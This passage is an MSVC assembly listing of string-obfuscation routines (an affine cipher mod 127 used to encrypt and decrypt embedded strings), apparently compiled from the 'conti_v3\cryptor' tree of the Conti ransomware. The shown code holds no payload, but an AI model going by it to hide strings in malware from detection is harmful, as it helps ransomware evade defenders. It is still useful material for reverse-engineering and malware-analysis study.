  00043	5f		 pop	 rdi
  00044	5d		 pop	 rbp
  00045	c3		 ret	 0
?decrypt@?$MetaBuffer@$0FD@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<83,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0FD@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?encrypt@?$MetaBuffer@$0FD@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z PROC ; MetaBuffer<83,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt, COMDAT

; 74   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 75   :         return (A * byte + B) % 127;

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	6b c0 53	 imul	 eax, eax, 83		; 00000053H
  0002d	83 c0 4b	 add	 eax, 75			; 0000004bH
  00030	99		 cdq
  00031	b9 7f 00 00 00	 mov	 ecx, 127		; 0000007fH
  00036	f7 f9		 idiv	 ecx
  00038	8b c2		 mov	 eax, edx

; 76   :     }

  0003a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
?encrypt@?$MetaBuffer@$0FD@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<83,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0FD@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
i$1 = 8
this$ = 256
?decrypt@?$MetaBuffer@$0FD@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<83,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt, COMDAT

; 62   :     {

$LN7:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 63   :         if (!isDecrypted())

  0001f	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ?isDecrypted@?$MetaBuffer@$0FD@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEBA_NXZ ; MetaBuffer<83,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::isDecrypted
  0002b	0f b6 c0	 movzx	 eax, al
  0002e	85 c0		 test	 eax, eax
  00030	75 53		 jne	 SHORT $LN5@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00032	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR i$1[rbp], 0
  0003a	eb 0b		 jmp	 SHORT $LN4@decrypt
$LN2@decrypt:
  0003c	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00040	48 ff c0	 inc	 rax
  00043	48 89 45 08	 mov	 QWORD PTR i$1[rbp], rax
$LN4@decrypt:
  00047	48 83 7d 08 0d	 cmp	 QWORD PTR i$1[rbp], 13
  0004c	73 37		 jae	 SHORT $LN3@decrypt

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0004e	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00052	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00059	48 03 c8	 add	 rcx, rax
  0005c	48 8b c1	 mov	 rax, rcx
  0005f	0f b6 50 01	 movzx	 edx, BYTE PTR [rax+1]
  00063	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0006a	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0FD@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<83,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt
  0006f	48 8b 4d 08	 mov	 rcx, QWORD PTR i$1[rbp]
  00073	48 8b 95 00 01
	00 00		 mov	 rdx, QWORD PTR this$[rbp]
  0007a	48 03 d1	 add	 rdx, rcx
  0007d	48 8b ca	 mov	 rcx, rdx
  00080	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00083	eb b7		 jmp	 SHORT $LN2@decrypt
$LN3@decrypt:
$LN5@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;

  00085	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0008c	48 ff c0	 inc	 rax

; 70   :     }

  0008f	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00096	5f		 pop	 rdi
  00097	5d		 pop	 rbp
  00098	c3		 ret	 0
?decrypt@?$MetaBuffer@$0FD@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<83,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0FD@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 224
?isDecrypted@?$MetaBuffer@$0FD@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEBA_NXZ PROC ; MetaBuffer<83,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::isDecrypted, COMDAT

; 57   :     {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 58   :         return m_isDecrypted;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	0f b6 00	 movzx	 eax, BYTE PTR [rax]

; 59   :     }

  00029	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00030	5f		 pop	 rdi
  00031	5d		 pop	 rbp
  00032	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0FD@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<83,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0FD@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
tv189 = 192
this$ = 240
data$ = 248
??0?$MetaBuffer@$0FD@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<83,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::MetaBuffer<83,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >, COMDAT

; 50   :     constexpr __forceinline MetaBuffer(const unsigned char* data)

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec f8 00
	00 00		 sub	 rsp, 248		; 000000f8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00024	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002b	c6 00 00	 mov	 BYTE PTR [rax], 0

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0002e	b8 01 00 00 00	 mov	 eax, 1
  00033	48 6b c0 00	 imul	 rax, rax, 0
  00037	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0003e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00042	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00049	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FD@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<83,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
  0004e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00055	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00058	b8 01 00 00 00	 mov	 eax, 1
  0005d	48 6b c0 01	 imul	 rax, rax, 1
  00061	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00068	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0006c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00073	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FD@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<83,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
  00078	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0007f	88 41 02	 mov	 BYTE PTR [rcx+2], al
  00082	b8 01 00 00 00	 mov	 eax, 1
  00087	48 6b c0 02	 imul	 rax, rax, 2
  0008b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00092	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00096	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0009d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FD@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<83,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
  000a2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000a9	88 41 03	 mov	 BYTE PTR [rcx+3], al
  000ac	b8 01 00 00 00	 mov	 eax, 1
  000b1	48 6b c0 03	 imul	 rax, rax, 3
  000b5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000bc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000c7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FD@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<83,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
  000cc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000d3	88 41 04	 mov	 BYTE PTR [rcx+4], al
  000d6	b8 01 00 00 00	 mov	 eax, 1
  000db	48 6b c0 04	 imul	 rax, rax, 4
  000df	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000e6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000f1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FD@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<83,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
  000f6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000fd	88 41 05	 mov	 BYTE PTR [rcx+5], al
  00100	b8 01 00 00 00	 mov	 eax, 1
  00105	48 6b c0 05	 imul	 rax, rax, 5
  00109	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00110	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00114	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0011b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FD@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<83,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
  00120	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00127	88 41 06	 mov	 BYTE PTR [rcx+6], al
  0012a	b8 01 00 00 00	 mov	 eax, 1
  0012f	48 6b c0 06	 imul	 rax, rax, 6
  00133	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0013a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0013e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00145	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FD@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<83,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
  0014a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00151	88 41 07	 mov	 BYTE PTR [rcx+7], al
  00154	b8 01 00 00 00	 mov	 eax, 1
  00159	48 6b c0 07	 imul	 rax, rax, 7
  0015d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00164	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00168	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0016f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FD@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<83,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
  00174	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0017b	88 41 08	 mov	 BYTE PTR [rcx+8], al
  0017e	b8 01 00 00 00	 mov	 eax, 1
  00183	48 6b c0 08	 imul	 rax, rax, 8
  00187	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0018e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00192	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00199	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FD@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<83,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
  0019e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001a5	88 41 09	 mov	 BYTE PTR [rcx+9], al
  001a8	b8 01 00 00 00	 mov	 eax, 1
  001ad	48 6b c0 09	 imul	 rax, rax, 9
  001b1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001b8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001bc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001c3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FD@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<83,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
  001c8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001cf	88 41 0a	 mov	 BYTE PTR [rcx+10], al
  001d2	b8 01 00 00 00	 mov	 eax, 1
  001d7	48 6b c0 0a	 imul	 rax, rax, 10
  001db	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001e2	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001e6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001ed	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FD@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<83,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
  001f2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001f9	88 41 0b	 mov	 BYTE PTR [rcx+11], al
  001fc	b8 01 00 00 00	 mov	 eax, 1
  00201	48 6b c0 0b	 imul	 rax, rax, 11
  00205	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0020c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00210	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00217	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FD@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<83,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
  0021c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00223	88 41 0c	 mov	 BYTE PTR [rcx+12], al
  00226	b8 01 00 00 00	 mov	 eax, 1
  0022b	48 6b c0 0c	 imul	 rax, rax, 12
  0022f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00236	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0023a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00241	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FD@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<83,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
  00246	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0024d	88 41 0d	 mov	 BYTE PTR [rcx+13], al
  00250	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00257	0f b6 40 01	 movzx	 eax, BYTE PTR [rax+1]
  0025b	88 85 c0 00 00
	00		 mov	 BYTE PTR tv189[rbp], al

; 52   :     {
; 53   : 
; 54   :     }

  00261	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00268	48 8d a5 d8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+216]
  0026f	5f		 pop	 rdi
  00270	5d		 pop	 rbp
  00271	c3		 ret	 0
??0?$MetaBuffer@$0FD@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<83,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::MetaBuffer<83,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$06$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?decrypt@?$MetaBuffer@$06$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z PROC ; MetaBuffer<7,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt, COMDAT

; 79   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	83 e8 6c	 sub	 eax, 108		; 0000006cH
  0002d	6b c0 ee	 imul	 eax, eax, -18
  00030	ba 7f 00 00 00	 mov	 edx, 127		; 0000007fH
  00035	8b c8		 mov	 ecx, eax
  00037	e8 00 00 00 00	 call	 ?positive_modulo@@YAHHH@Z ; positive_modulo

; 81   :     }

  0003c	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00043	5f		 pop	 rdi
  00044	5d		 pop	 rbp
  00045	c3		 ret	 0
?decrypt@?$MetaBuffer@$06$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<7,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$06$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?encrypt@?$MetaBuffer@$06$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z PROC ; MetaBuffer<7,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt, COMDAT

; 74   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 75   :         return (A * byte + B) % 127;

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	6b c0 07	 imul	 eax, eax, 7
  0002d	83 c0 6c	 add	 eax, 108		; 0000006cH
  00030	99		 cdq
  00031	b9 7f 00 00 00	 mov	 ecx, 127		; 0000007fH
  00036	f7 f9		 idiv	 ecx
  00038	8b c2		 mov	 eax, edx

; 76   :     }

  0003a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
?encrypt@?$MetaBuffer@$06$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<7,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$06$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
i$1 = 8
this$ = 256
?decrypt@?$MetaBuffer@$06$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<7,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt, COMDAT

; 62   :     {

$LN7:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 63   :         if (!isDecrypted())

  0001f	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ?isDecrypted@?$MetaBuffer@$06$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEBA_NXZ ; MetaBuffer<7,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::isDecrypted
  0002b	0f b6 c0	 movzx	 eax, al
  0002e	85 c0		 test	 eax, eax
  00030	75 53		 jne	 SHORT $LN5@decrypt

; 64   :         {
